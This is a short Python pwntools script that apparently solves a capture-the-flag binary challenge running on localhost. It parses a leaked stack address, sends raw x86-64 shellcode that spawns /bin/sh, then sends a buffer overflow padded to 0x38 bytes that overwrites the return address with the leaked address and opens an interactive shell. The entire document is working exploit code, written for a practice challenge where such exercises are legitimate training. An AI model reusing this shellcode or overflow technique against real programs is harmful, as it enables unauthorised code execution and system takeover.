from pwn import *

target = remote("localhost", 30006)
# target = process("./chall_06")
# gdb.attach(target)


leak = target.recvline()
print(leak)
leak = leak.split(b"again: ")[1]
leak = int(leak, 16)

target.sendline(b"\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05")


target.recvline()


print("leak is: %s" % hex(leak))

payload = b""
payload += b"0"*(0x38 - len(payload))
payload += p64(leak)

target.sendline(payload)

target.interactive()
